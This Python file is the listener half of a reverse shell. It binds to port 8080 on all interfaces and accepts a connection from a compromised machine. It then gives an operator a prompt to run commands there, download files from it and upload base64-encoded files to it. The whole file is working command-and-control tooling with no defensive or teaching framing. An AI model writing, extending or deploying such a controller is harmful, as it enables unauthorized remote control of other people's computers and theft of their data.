import socket
import base64
import simplejson
class MyListen():
    def __init__(self,ip,port):
        self.conne = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.conne.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.conne.bind((ip,port))
        self.conne.listen(0)
        (self.who_connected,addr_con) = self.conne.accept()
    
    def json_send(self,data):
            json_data = simplejson.dumps(data)
            self.who_connected.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.who_connected.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def save_file(self,path,content):
        try:
            content = base64.b64decode(content)
            with open(path, "wb") as savefile:
                savefile.write(content)
                print("download ok")
        except:
            pass
    
    def send_file(self,path):
        try:
            with open(path, "rb") as sendfile:
                sendfile = sendfile.read()
                sendfile = base64.b64encode(sendfile)
                return sendfile
        except:
            pass

    def command_exe(self):
        try:
            while True:
                comm_req = input("Command: ")
                comm_req = comm_req.split(" ")
                if comm_req[0] == "quit":
                    self.json_send("quit")
                    exit()
                elif comm_req[0] == "download":
                    self.json_send(comm_req)
                    com_result = self.json_receive()
                    self.save_file(comm_req[1],com_result)
                elif comm_req[0] == "upload":
                    comm_req.append((self.send_file(comm_req[1])))
                    self.json_send(comm_req)
                    control_mes = self.json_receive()
                    print(control_mes)
                else:
                    self.json_send(comm_req)
                    com_result = self.json_receive()
                    print(com_result)
        except:
            pass
listen_con = MyListen("0.0.0.0",8080)
listen_con.command_exe()

